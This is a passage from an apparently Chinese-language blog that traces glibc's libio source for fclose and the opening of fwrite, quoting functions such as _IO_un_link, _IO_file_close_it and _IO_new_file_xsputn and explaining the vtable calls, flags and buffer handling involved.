class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧是先检测魔数位来到，检查<code>_IO_IS_FILEBUF</code>文件指针 <code>fp</code> 是否与文件缓冲区相关联，</p><h3 id="IO-un-link-脱链"><a href="#IO-un-link-脱链" class="headerlink" title="_IO_un_link 脱链"></a>_IO_un_link 脱链</h3><p>_IO_un_link ((struct _IO_FILE_plus *) fp)</p><p><strong>libio&#x2F;genops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">    ;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">      <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">        &#123;</span><br><span class="line">          *f = fp-&gt;file._chain;</span><br><span class="line">          ++_IO_list_all_stamp;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_un_link)</span><br></pre></td></tr></table></figure><p>IO_link_in逆过程，把文件流结构体从链上拿下来，先检测_IO_LINKED(0x80)，看文件流结构体是不是在IO_list_all链中，随后把_IO_list_all指向chain字段也就是下一个</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401221712640.png" alt="image-20230401221712640"></p><p>再把_IO_LINKED标志位置空</p><h3 id="IO-file-close-it-缓冲区数据写回文件，释放缓冲区，关闭文件"><a href="#IO-file-close-it-缓冲区数据写回文件，释放缓冲区，关闭文件" class="headerlink" title="_IO_file_close_it 缓冲区数据写回文件，释放缓冲区，关闭文件"></a>_IO_file_close_it 缓冲区数据写回文件，释放缓冲区，关闭文件</h3><p><strong>libio&#x2F;fileops.c</strong></p><p>返回_IO_new_fclose 调用_IO_file_close_it (fp);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_close_it _IO_file_close_it</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">              ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free buffer. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_wbackup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">      _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  _IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  _IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);<span class="comment">//再次确保脱链</span></span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure><p>首先检测不可写标志(0x8)，再检测<code>_IO_CURRENTLY_PUTTING(0x800)</code>文件是否处于输出状态。</p><p>在fwrite中设置了_IO_CURRENTLY_PUTTING标志位</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401224153932.png" alt="image-20230401224153932"></p><img src="/2023/04/01/IO-FILE-fclose/image-20230401224234824.png" alt="image-20230401224234824" style="zoom:67%;"><h4 id="IO-do-flush-fp-缓冲区数据写回文件"><a href="#IO-do-flush-fp-缓冲区数据写回文件" class="headerlink" title="_IO_do_flush (fp) 缓冲区数据写回文件"></a>_IO_do_flush (fp) 缓冲区数据写回文件</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">           (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和fwrite里分析的一样_IO_SYSWRITE调用了<mark>&#x3D;&#x3D;vtable中__write对应的<code>_IO_new_file_write</code>&#x3D;&#x3D;<mark></mark></mark></p><p>写入文件并，刷新输出缓冲区的值</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230150953.png" alt="image-20230401230150953"></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230235192.png" alt="image-20230401230235192"></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230304718.png" alt="image-20230401230304718"></p><h4 id="IO-SYSCLOSE-fp-关闭文件"><a href="#IO-SYSCLOSE-fp-关闭文件" class="headerlink" title="_IO_SYSCLOSE(fp) 关闭文件"></a>_IO_SYSCLOSE(fp) 关闭文件</h4><p>回到_IO_new_file_close_it</p><blockquote><p><code>_IO_FLAGS2_NOCLOSE(32)</code>表示一个流不应该被 <code>fclose()</code> 函数关闭。为流设置 <code>_IO_FLAGS2_NOCLOSE</code> 标志将防止 <code>fclose()</code> 函数关闭与流相关联的文件描述符。这在文件描述符正在被程序的其他部分使用或流正在用于与需要文件描述符保持打开状态的设备进行通信的情况下非常有用</p></blockquote><p>调用_IO_SYSCLOSE(fp)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSCLOSE(FP) JUMP0 (__close, FP)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;虚表中的__close，即_IO_file_close函数&#x3D;&#x3D;<mark></mark></mark></p><p><strong>&#x2F;libio&#x2F;fileops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_close (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Cancelling close should be avoided if possible since it leaves an</span></span><br><span class="line"><span class="comment">     unrecoverable state behind.  */</span></span><br><span class="line">  <span class="keyword">return</span> close_not_cancel (fp-&gt;_fileno);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> close_not_cancel(fd) \</span></span><br><span class="line"><span class="meta">  __close (fd)</span></span><br></pre></td></tr></table></figure><img src="/2023/04/01/IO-FILE-fclose/image-20230401232801039.png" alt="image-20230401232801039" style="zoom:80%;"><p>直接系统调用close关闭文件</p><h4 id="销毁文件流结构体内容-释放缓冲区"><a href="#销毁文件流结构体内容-释放缓冲区" class="headerlink" title="销毁文件流结构体内容,释放缓冲区"></a>销毁文件流结构体内容,释放缓冲区</h4><p>回到**_IO_new_file_close_it**_mode&#x3D;-1不符合条件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放缓冲区，_IO_buf_base，_IO_buf_end置空，设置_IO_USER_BUF位域</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setp(__fp, __p, __ep) \</span></span><br><span class="line"><span class="meta">       ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr \</span></span><br><span class="line"><span class="meta">    = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br></pre></td></tr></table></figure><p>macro展开后</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (<span class="literal">NULL</span>), (fp)-&gt;_IO_read_ptr = (<span class="literal">NULL</span>), (fp)-&gt;_IO_read_end = (<span class="literal">NULL</span>));</span><br><span class="line">((fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = <span class="literal">NULL</span>, (fp)-&gt;_IO_write_end = (<span class="literal">NULL</span>));</span><br></pre></td></tr></table></figure><p>把read write相关缓冲区指针置空</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401235020311.png" alt="image-20230401235020311"></p><h3 id="确认文件关闭，释放文件流结构体内存"><a href="#确认文件关闭，释放文件流结构体内存" class="headerlink" title="确认文件关闭，释放文件流结构体内存"></a>确认文件关闭，释放文件流结构体内存</h3><h3 id="IO-new-file-finish"><a href="#IO-new-file-finish" class="headerlink" title="IO_new_file_finish"></a>IO_new_file_finish</h3><p>回到 <strong>_IO_new_fclose</strong> _IO_FINISH (fp);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;虚表中的_finish，对应_IO_new_file_finish函数&#x3D;&#x3D;<mark></mark></mark></p><p><strong>libio&#x2F;fileops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">    _IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br></pre></td></tr></table></figure><p>直接来到_IO_default_finish(fp)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_finish)</span><br></pre></td></tr></table></figure><p>都不符合要求来到_IO_un_link<code>if (fp-&gt;file._flags &amp; _IO_LINKED)</code>不符合，返回_IO_new_fclose</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">  &#123;</span><br><span class="line">    fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(fp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>置零后释放文件流结构体内存</p><h2 id="close函数调用的vtable函数"><a href="#close函数调用的vtable函数" class="headerlink" title="close函数调用的vtable函数"></a><code>close</code>函数调用的vtable函数</h2><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中<code>__write</code>对应的<code>_IO_new_file_write</code>的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为<code>_close</code>，即<code>_IO_file_close</code>函函数。</li><li><code>_IO_FINISH</code>函数为vtable _finish，对应<code>_IO_new_file_finish</code>函数</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fwrite</title>
      <link href="/2023/04/01/IO-FILE-fwrite/"/>
      <url>/2023/04/01/IO-FILE-fwrite/</url>
      
        <content type="html"><![CDATA[<h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure><p>测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>]=<span class="string">&quot;flag&#123;grxer&#125;&quot;</span>;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;./flag1&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x2F-libio-x2F-iofwrite-c-IO-fwrite"><a href="#x2F-libio-x2F-iofwrite-c-IO-fwrite" class="headerlink" title="&#x2F;libio&#x2F;iofwrite.c _IO_fwrite"></a><strong>&#x2F;libio&#x2F;iofwrite.c _IO_fwrite</strong></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CHECK_FILE</strong>检测一下flag的魔数，加锁判断</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> _IO_fwide(__fp, __mode) \</span></span><br><span class="line"><span class="meta">  (&#123; int __result = (__mode);                              \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__result &lt; 0 &amp;&amp; ! _IO_fwide_maybe_incompatible)              \</span></span><br><span class="line"><span class="meta">       &#123;                                      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> ((__fp)-&gt;_mode == 0)      \</span></span><br><span class="line"><span class="meta">       <span class="comment">/* We know that all we have to do is to set the flag.  */</span>      \</span></span><br><span class="line"><span class="meta">       (__fp)-&gt;_mode = -1;      \</span></span><br><span class="line"><span class="meta">     __result = (__fp)-&gt;_mode;      \</span></span><br><span class="line"><span class="meta">       &#125;                                      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">else</span> <span class="keyword">if</span> (__builtin_constant_p (__mode) &amp;&amp; (__mode) == 0)              \</span></span><br><span class="line"><span class="meta">       __result = _IO_fwide_maybe_incompatible ? -1 : (__fp)-&gt;_mode;          \</span></span><br><span class="line"><span class="meta">     <span class="keyword">else</span>                                      \</span></span><br><span class="line"><span class="meta">       __result = _IO_fwide (__fp, __result);                      \</span></span><br><span class="line"><span class="meta">     __result; &#125;)</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401120543002.png" alt="image-20230401120543002"></p><h3 id="进入-IO-sputn，"><a href="#进入-IO-sputn，" class="headerlink" title="进入_IO_sputn，"></a>进入_IO_sputn，</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;调用vtable里**__xsputn<strong>指向的</strong>libio&#x2F;fileops.c里的_IO_new_file_xsputn**函数，传入的参数为文件流结构体_IO_FILE,数据目标地址，读取总字节数&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">      <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          count = p - s + <span class="number">1</span>;</span><br><span class="line">          must_flush = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span 